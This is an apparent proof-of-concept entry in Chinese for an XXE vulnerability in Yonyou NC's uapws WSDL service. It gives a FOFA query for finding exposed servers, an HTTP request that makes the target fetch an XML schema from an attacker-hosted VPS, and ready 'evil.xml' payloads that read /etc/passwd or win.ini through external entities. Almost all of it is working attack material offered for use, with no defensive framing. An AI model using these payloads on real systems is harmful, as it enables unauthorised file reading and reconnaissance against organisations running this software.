## 用友 NC uapws wsdl XXE漏洞
用友 NC uapws wsdl 存在XXE漏洞

## fofa
```
app="用友-UFIDA-NC"
```

## poc
```
http://x.x.x.x/uapws/service/nc.uap.oba.update.IUpdateService?wsdl

GET /uapws/service/nc.uap.oba.update.IUpdateService?xsd=http://x.x.x.x/test.xml HTTP/1.1
Host:
Pragma: no-cache
Cache-Control: no-cache
Accept: text/plain, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
```

![image](https://github.com/wy876/POC/assets/139549762/d11cc7e3-b0d2-484d-9911-ca742cc384d5)

![image](https://github.com/wy876/POC/assets/139549762/7a77f089-7a6e-49e4-965b-59ebe9fe23fb)

## xxe读取文件
任意文件读取利用，需要VPS上建立对应操作系统的xml文件，然后开启http服务。xml文件如下

```
windows:
<?xml version="1.0"?><!DOCTYPE test [<!ENTITY name SYSTEM "file:///c://windows/win.ini">]><user><username>&name;</username><password>1</password></user>

linux:
evil.xml:
<?xml version="1.0"?><!DOCTYPE test [<!ENTITY name SYSTEM "file:///etc/passwd">]><user><username>&name;</username><password>1</password></user>
```

![image](https://github.com/wy876/POC/assets/139549762/dfbf0584-9fa5-45ea-92d0-0e13160d4bf0)

![image](https://github.com/wy876/POC/assets/139549762/c218c1dd-e73b-42b5-bbce-f96da6efbb08)

